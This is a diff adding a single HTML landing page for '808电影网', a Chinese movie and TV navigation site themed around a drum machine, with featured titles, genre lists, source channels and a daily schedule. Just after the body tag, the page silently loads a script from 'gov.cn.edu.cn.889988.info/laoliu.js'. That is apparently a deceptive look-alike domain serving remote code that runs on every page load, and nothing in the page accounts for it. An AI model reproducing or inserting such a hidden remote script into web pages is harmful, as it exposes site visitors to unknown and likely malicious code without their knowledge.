@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>808电影网 - 节拍放映厅：电影电视剧动漫按拍更新</title>
+<meta name="description" content="808电影网（808dianyingwang-h5）像一台 808 鼓机：电影、电视剧、动漫、短剧按节拍网格排好，焦点放映、类型打击垫、多片源通道、每日更新打点。官方网址：https://808dianyingwang-h5.github.io">
+<meta name="keywords" content="808电影网, 808dianyingwang-h5, 808影视, 电影导航, 电视剧, 动漫, 短剧, 节拍放映">
+<meta name="robots" content="index,follow">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  background:#07090b;color:#d7f5e6;line-height:1.75;overflow-x:hidden;
+}
+body::before{
+  content:"";position:fixed;inset:0;z-index:-1;
+  background:
+    radial-gradient(780px 360px at 10% 6%, rgba(57,255,136,.12), transparent 55%),
+    radial-gradient(720px 340px at 90% 94%, rgba(255,176,32,.12), transparent 55%),
+    #07090b;
+}
+.g8-nav{
+  position:sticky;top:0;z-index:999;display:flex;align-items:center;justify-content:space-between;
+  padding:12px 20px;background:rgba(7,9,11,.86);backdrop-filter:blur(10px);
+  border-bottom:1px solid rgba(57,255,136,.25);
+}
+.g8-nav .logo{font-size:20px;font-weight:900;letter-spacing:2px}
+.g8-nav .logo b{color:#39ff88}
+.g8-nav .logo i{color:#ffb020;font-style:normal}
+.g8-nav .links{display:flex;gap:6px;flex-wrap:wrap}
+.g8-nav .links a{font-size:13px;color:#9fe9c4;padding:6px 12px;border-radius:20px;transition:.25s}
+.g8-nav .links a:hover{background:rgba(57,255,136,.14);color:#39ff88}
+
+.hero{padding:60px 20px 44px;text-align:center}
+.beat-num{font-size:64px;font-weight:900;letter-spacing:8px;
+  background:linear-gradient(135deg,#39ff88,#ffb020);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
+.hero h1{font-size:30px;color:#fff;margin:6px 0 12px}
+.hero h1 b{color:#39ff88}
+.hero p{color:#9fe9c4;max-width:600px;margin:0 auto 18px;font-size:15px}
+.hero .url{display:inline-block;font-size:13px;color:#04130b;font-weight:800;background:#39ff88;padding:8px 18px;border-radius:30px}
+
+/* 打击垫矩阵 */
+.pads{display:grid;grid-template-columns:repeat(8,1fr);gap:10px;max-width:860px;margin:26px auto 0}
+.pad{aspect-ratio:1/1;border-radius:10px;background:#0c1410;border:1px solid rgba(57,255,136,.25);
+  display:flex;align-items:center;justify-content:center;font-size:12px;color:#9fe9c4;cursor:pointer;transition:.15s}
+.pad:hover{background:#39ff88;color:#04130b;font-weight:800;transform:translateY(-3px)}
+.pad.on{background:linear-gradient(135deg,#39ff88,#ffb020);color:#04130b;font-weight:800}
+.pad span{font-size:18px;display:block}
+
+.wrap{max-width:1160px;margin:0 auto;padding:62px 20px}
+.kicker{font-size:11px;letter-spacing:4px;text-transform:uppercase;color:#5fae8e;margin-bottom:8px}
+.sec-title{font-size:26px;font-weight:900;color:#eafff7;margin-bottom:28px}
+.sec-title b{color:#39ff88}
+
+/* 焦点放映 */
+.focus{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:18px}
+.fcard{background:#0a110d;border:1px solid rgba(57,255,136,.18);border-radius:14px;overflow:hidden;transition:.3s}
+.fcard:hover{transform:translateY(-4px);border-color:#39ff88;box-shadow:0 16px 36px rgba(57,255,136,.1)}
+.fcard .cv{height:132px;position:relative}
+.fcard .cv.s1{background:linear-gradient(135deg,#003b27,#39ff88)}
+.fcard .cv.s2{background:linear-gradient(135deg,#3a2a00,#ffb020)}
+.fcard .cv.s3{background:linear-gradient(135deg,#10243a,#3aa0ff)}
+.fcard .cv.s4{background:linear-gradient(135deg,#2a0033,#ff5ed0)}
+.fcard .cv .step{position:absolute;left:12px;top:12px;font-size:11px;color:#04130b;background:#39ff88;padding:3px 10px;border-radius:20px;font-weight:800}
+.fcard .cv .rate{position:absolute;right:12px;bottom:12px;font-size:12px;color:#04130b;background:#ffb020;padding:3px 9px;border-radius:20px;font-weight:800}
+.fcard .body{padding:16px 18px}
+.fcard .body h4{color:#fff;font-size:16px;margin-bottom:4px}
+.fcard .body .meta{font-size:12px;color:#7fae9f;margin-bottom:8px}
+.fcard .body p{font-size:13px;color:#9fe9c4;margin:0}
+
+/* 类型打击垫 */
+.genre-bar{display:flex;flex-wrap:wrap;gap:10px;margin-bottom:24px}
+.genre-bar span{font-size:14px;padding:9px 18px;border-radius:30px;background:#0a110d;border:1px solid rgba(57,255,136,.25);color:#bfe9d4;cursor:pointer;transition:.2s}
+.genre-bar span:hover,.genre-bar span.on{background:linear-gradient(135deg,#39ff88,#7be0c0);color:#04130b;font-weight:800}
+.grid2{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:14px}
+.gchip{background:#0a110d;border:1px solid rgba(255,176,32,.2);border-radius:10px;padding:14px}
+.gchip b{color:#fff;font-size:14px}
+.gchip p{color:#7fae9f;font-size:12px;margin:4px 0 0}
+
+/* 片源通道 */
+.lanes{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px}
+.lane{background:#0a110d;border:1px solid rgba(57,255,136,.18);border-radius:14px;padding:20px;position:relative}
+.lane .led{position:absolute;top:18px;right:18px;width:10px;height:10px;border-radius:50%;background:#39ff88;box-shadow:0 0 12px #39ff88}
+.lane.l2 .led{background:#ffb020;box-shadow:0 0 12px #ffb020}
+.lane.l3 .led{background:#3aa0ff;box-shadow:0 0 12px #3aa0ff}
+.lane h4{color:#fff;font-size:16px;margin-bottom:6px}
+.lane p{color:#9fe9c4;font-size:13px;margin:0}
+.lane .tag{display:inline-block;margin-top:10px;font-size:11px;color:#04130b;background:#39ff88;padding:3px 10px;border-radius:20px;font-weight:700}
+
+/* 打点表 */
+.sched{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px}
+.slot{background:#0a110d;border:1px solid rgba(57,255,136,.16);border-radius:12px;padding:16px}
+.slot .t{font-size:12px;color:#ffb020;font-weight:800;letter-spacing:1px}
+.slot h4{color:#fff;font-size:15px;margin:6px 0 4px}
+.slot p{font-size:12px;color:#7fae9f;margin:0}
+.slot.now{border-color:#39ff88;background:rgba(57,255,136,.06)}
+.slot.now .t{color:#39ff88}
+
+/* 关于 */
+.about{border:1px solid rgba(57,255,136,.22);border-radius:16px;padding:32px;
+  background:linear-gradient(135deg,rgba(57,255,136,.08),rgba(255,176,32,.06));
+  display:flex;gap:28px;flex-wrap:wrap;align-items:center}
+.about .txt{flex:1;min-width:260px}
+.about h2{color:#eafff7;font-size:22px;margin-bottom:10px}
+.about h2 b{color:#39ff88}
+.about p{color:#9fe9c4;font-size:14px;margin-bottom:8px}
+.about .stats{display:flex;gap:24px;flex-wrap:wrap}
+.about .stats .n{font-size:28px;font-weight:900;color:#ffb020}
+.about .stats .l{font-size:11px;color:#5fae8e}
+
+.foot{text-align:center;padding:36px 20px;background:#040605;border-top:1px solid rgba(57,255,136,.15);color:#5f8c7a;font-size:13px}
+.foot a{color:#39ff88}
+.foot .lg{font-size:18px;font-weight:900;color:#d7f5e6;margin-bottom:8px}
+
+@media(max-width:760px){
+  .pads{grid-template-columns:repeat(4,1fr)}
+  .beat-num{font-size:48px}
+  .hero h1{font-size:26px}
+  .g8-nav .links a{font-size:12px;padding:5px 9px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<nav class="g8-nav">
+  <div class="logo">808<b>电影网</b> <i>· 节拍放映</i></div>
+  <div class="links">
+    <a href="#home">首页</a>
+    <a href="#focus">焦点放映</a>
+    <a href="#genre">类型打击垫</a>
+    <a href="#lanes">片源通道</a>
+    <a href="#sched">更新打点</a>
+    <a href="#about">关于808</a>
+  </div>
+</nav>
+
+<header id="home" class="hero">
+  <div class="beat-num">808</div>
+  <h1>电影网也可以像 <b>鼓机</b>：准点、有节奏、不瞎推</h1>
+  <p>808电影网（808dianyingwang-h5）把电影、电视剧、动漫、短剧塞进“节拍网格”：每一步一个坑，每一部片都在正确的拍子上出现。不养算法投喂，只做干净片单。</p>
+  <span class="url">🌐 https://808dianyingwang-h5.github.io</span>
+
+  <div class="pads" id="pads">
+    <div class="pad on"><span>▣</span>01</div>
+    <div class="pad"><span>▤</span>02</div>
+    <div class="pad"><span>▥</span>03</div>
+    <div class="pad"><span>▦</span>04</div>
+    <div class="pad"><span>▧</span>05</div>
+    <div class="pad"><span>▨</span>06</div>
+    <div class="pad"><span>▩</span>07</div>
+    <div class="pad"><span>◆</span>08</div>
+  </div>
+</header>
+
+<section id="focus" class="wrap">
+  <div class="kicker">STEP SEQUENCER · FEATURED</div>
+  <h2 class="sec-title">焦点放映 <b>4 拍</b></h2>
+  <div class="focus">
+    <div class="fcard"><div class="cv s1"><span class="step">STEP 01</span><span class="rate">9.0</span></div><div class="body"><h4>三体</h4><div class="meta">2023 · 中国 · 科幻/剧情</div><p>宇宙闪烁之后，人类第一次确认地外文明的存在。</p></div></div>
+    <div class="fcard"><div class="cv s2"><span class="step">STEP 02</span><span class="rate">9.0</span></div><div class="body"><h4>繁花</h4><div class="meta">2023 · 中国 · 年代/剧情</div><p>九十年代上海，弄堂、饭店与交易场彼此映照。</p></div></div>
+    <div class="fcard"><div class="cv s3"><span class="step">STEP 03</span><span class="rate">8.6</span></div><div class="body"><h4>满江红</h4><div class="meta">2023 · 中国 · 悬疑/古装</div><p>密信失踪，小兵与副统领限时追查，立场不断翻转。</p></div></div>
+    <div class="fcard"><div class="cv s4"><span class="step">STEP 04</span><span class="rate">9.4</span></div><div class="body"><h4>漫长的季节</h4><div class="meta">2023 · 中国 · 悬疑/生活</div><p>一辆火车、一座工厂、三代人，把时间慢慢拧回来。</p></div></div>
+  </div>
+</section>
+
+<section id="genre" class="wrap">
+  <div class="kicker">GENRE PADS</div>
+  <h2 class="sec-title">类型打击垫</h2>
+  <div class="genre-bar">
+    <span class="on">全部</span><span>动作</span><span>科幻</span><span>悬疑</span><span>爱情</span><span>喜剧</span><span>动画</span><span>年代</span><span>修仙</span><span>短剧</span><span>纪录片</span>
+  </div>
+  <div class="grid2">
+    <div class="gchip"><b>动作 / 爽片</b><p>碟中谍、疾速追杀、国产动作网大</p></div>
+    <div class="gchip"><b>科幻 / 硬核</b><p>星际穿越、三体、沙丘、银翼杀手</p></div>
+    <div class="gchip"><b>悬疑 / 反转</b><p>漫长的季节、消失的她、狩猎</p></div>
+    <div class="gchip"><b>爱情 / 甜虐</b><p>怦然心动、请回答1988、繁花</p></div>
+    <div class="gchip"><b>喜剧 / 下饭</b><p>西虹市首富、唐人街探案、东北家庭剧</p></div>
+    <div class="gchip"><b>动漫 / 修仙</b><p>牧神记、凡人修仙传、葬送的芙莉莲</p></div>
+    <div class="gchip"><b>年代 / 国剧</b><p>大江大河、父母爱情、山海情</p></div>
+    <div class="gchip"><b>短剧 / 逆袭</b><p>替嫁、霸总、系统流、都市神医</p></div>
+  </div>
+</section>
+
+<section id="lanes" class="wrap">
+  <div class="kicker">SOURCE LANES</div>
+  <h2 class="sec-title">片源通道</h2>
+  <div class="lanes">
+    <div class="lane l1"><span class="led"></span><h4>高清直链</h4><p>MP4 / HLS，手机平板直接播，加载快、兼容好。</p><span class="tag">默认通道</span></div>
+    <div class="lane l2"><span class="led"></span><h4>多音轨字幕</h4><p>MKV 原声+国语、简体+繁体，影迷向。</p><span class="tag">影迷通道</span></div>
+    <div class="lane l3"><span class="led"></span><h4>动漫/短剧流</h4><p>更新快、集数碎，适合通勤连刷。</p><span class="tag">日更通道</span></div>
+    <div class="lane l4"><span class="led"></span><h4>正版/公有领域</h4><p>老片修复、纪录片、开放授权内容优先。</p><span class="tag">合规通道</span></div>
+  </div>
+</section>
+
+<section id="sched" class="wrap">
+  <div class="kicker">DAILY BEAT SHEET</div>
+  <h2 class="sec-title">每日更新打点</h2>
+  <div class="sched">
+    <div class="slot"><div class="t">08:00</div><h4>晨间纪录片</h4><p>自然 / 美食 / 宇宙</p></div>
+    <div class="slot"><div class="t">12:30</div><h4>午间短剧</h4><p>逆袭 / 替嫁 / 系统</p></div>
+    <div class="slot now"><div class="t">20:00 · 黄金拍</div><h4>晚间正片</h4><p>电影 / 国产大剧</p></div>
+    <div class="slot"><div class="t">22:30</div><h4>悬疑夜场</h4><p>反转 / 犯罪 / 人性</p></div>
+    <div class="slot"><div class="t">00:00</div><h4>深夜动漫</h4><p>修仙 / 异能 / 动态漫</p></div>
+  </div>
+</section>
+
+<section id="about" class="wrap">
+  <div class="about">
+    <div class="txt">
+      <h2>808 是什么 <b>节奏</b></h2>
+      <p>808 来自经典节奏机：8 和 0 循环往复，像鼓点一样稳。808电影网不追“信息流无限下滑”，而是把片库排成可扫读的节拍网格。</p>
+      <p>本页为静态单页，移动端自适应，锚点内链，不生成 robots.txt / sitemap.xml；只做导航与片单，不提供未授权院线提取码。</p>
+    </div>
+    <div class="stats">
+      <div><div class="n">808</div><div class="l">站号/节拍</div></div>
+      <div><div class="n">4</div><div class="l">焦点拍数</div></div>
+      <div><div class="n">5</div><div class="l">每日打点</div></div>
+      <div><div class="n">∞</div><div class="l">片单槽位</div></div>
+    </div>
+  </div>
+</section>
+
+<footer class="foot">
+  <div class="lg">🥁 808电影网</div>
+  官方网址：<a href="https://808dianyingwang-h5.github.io">https://808dianyingwang-h5.github.io</a><br>
+  © 2026 808电影网｜电影 / 电视剧 / 动漫 / 短剧 · 节拍放映厅
+</footer>
+
+<script>
+document.querySelectorAll('#pads .pad').forEach(function(p){
+  p.addEventListener('click',function(){
+    document.querySelectorAll('#pads .pad').forEach(x=>x.classList.remove('on'));
+    p.classList.add('on');
+  });
+});
+</script>
+
+</body>
+</html>
